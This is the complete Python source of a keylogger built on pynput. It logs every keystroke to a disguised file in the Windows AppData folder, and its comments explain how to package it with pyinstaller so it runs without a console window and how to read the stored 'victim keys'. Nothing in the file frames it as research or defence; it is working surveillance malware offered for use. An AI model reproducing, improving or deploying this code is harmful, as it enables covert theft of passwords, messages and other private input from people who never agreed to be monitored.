import os

from pynput.keyboard import Listener

keys = []
count = 0
path = os.environ['appdata']+'\\drahthok.txt' # For win os
# path = '/root/drahthok.txt' for linux
def on_press(key):

    global keys, count

    keys.append(key)

    count += 1 

    if count >= 1:

        count = 0
        write_file(keys)
        keys = []

# pyinstaller keylogger.py --onefile --noconsole
# cd .datetime A combination of a date and a time. Attributes: ()
# IF YOU SUCCESCLY RUN THIS PROGRAM EASY THEB WRITE THIS CODE IN COMMAND LINE TO SEE VICTIM KEYS
# cd .. 
# cd appdata
# cd Roaming
# dir 
# type drahthok.txt
def write_file(keys):

    with open(path, 'a') as file:

        for key in keys:

            k = str(key).replace("'","")

            if k.find('backspace') > 0:

                file.write(' Backspace ')

            elif k.find('enter') > 0:

                file.write('\n')
            
            elif k.find('shift') > 0:

                file.write(' Shift ')

            elif k.find('space') > 0:

                file.write(' ')
 
            elif k.find('caps_lock') > 0:

                file.write(' caps_lock ')
 
            elif k.find('Key'):

                file.write(k)

with Listener(on_press = on_press) as listener:

    listener.join()